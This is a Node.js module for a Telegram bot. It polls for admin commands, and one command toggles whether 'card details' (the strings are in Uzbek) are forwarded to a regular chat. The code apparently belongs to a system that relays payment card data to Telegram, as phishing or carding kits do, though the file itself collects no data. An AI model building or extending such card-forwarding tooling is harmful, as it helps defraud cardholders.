const config = require('../config');
const telegram = require('./telegram');
const stateService = require('./state');

let lastUpdateId = 0;

async function startPolling() {
    if (!config.TELEGRAM_BOT_TOKEN || !config.ADMIN_TELEGRAM_CHAT_ID) {
        console.log('⚠️ Bot polling disabled: missing TELEGRAM_BOT_TOKEN or ADMIN_TELEGRAM_CHAT_ID');
        return;
    }

    console.log('🤖 Starting Telegram bot polling...');
    poll();
}

async function poll() {
    try {
        const response = await fetch(
            `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
        );
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            for (const update of data.result) {
                lastUpdateId = update.update_id;
                await handleUpdate(update);
            }
        }
    } catch (e) {
        // Silent fail
    }

    setTimeout(poll, 1000);
}

async function handleUpdate(update) {
    if (!update.message || !update.message.text) return;

    const chatId = update.message.chat.id.toString();
    const text = update.message.text.trim();

    // Only respond in admin chat
    if (chatId !== config.ADMIN_TELEGRAM_CHAT_ID) return;

    // Handle commands
    if (text.startsWith('/activecarddetails')) {
        const state = stateService.get();
        state.sendCardToRegularChat = !state.sendCardToRegularChat;
        stateService.update(state);

        const statusText = state.sendCardToRegularChat
            ? '✅ Karta ma\'lumotlari oddiy chatga yuboriladi'
            : '❌ Karta ma\'lumotlari oddiy chatga yuborilmaydi';

        await telegram.sendMessage(chatId, statusText);
        console.log(`Card details to regular chat: ${state.sendCardToRegularChat}`);
    }

    if (text === '/status') {
        const state = stateService.get();
        await telegram.sendMessage(chatId,
            `📊 <b>Server Status</b>\n\n` +
            `💳 Karta → oddiy chat: ${state.sendCardToRegularChat ? '✅' : '❌'}`
        );
    }
}

module.exports = {
    startPolling
};
